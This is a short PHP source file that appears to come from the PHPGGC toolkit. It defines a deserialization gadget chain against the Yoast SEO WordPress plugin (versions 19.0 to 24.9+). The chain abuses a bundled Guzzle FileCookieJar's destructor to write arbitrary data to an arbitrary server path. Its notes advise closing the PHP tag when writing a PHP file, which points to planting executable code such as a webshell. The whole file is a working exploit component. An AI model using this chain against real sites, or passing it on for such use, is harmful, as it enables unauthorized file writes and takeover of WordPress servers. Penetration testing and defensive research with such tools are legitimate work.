<?php

namespace GadgetChain\WordPress\P\YoastSEO;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '19.0 <= 24.9+';
    public static $vector = '__destruct';
    public static $author = 'whattheslime';
    public static $information = "If you're writing a php file, don't forget to add `?>` at the end of the file 
    to close the php `<?php` tag to avoid errors, as there will be garbage in the 
    destination file.";

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar($path, $data);
    }
}
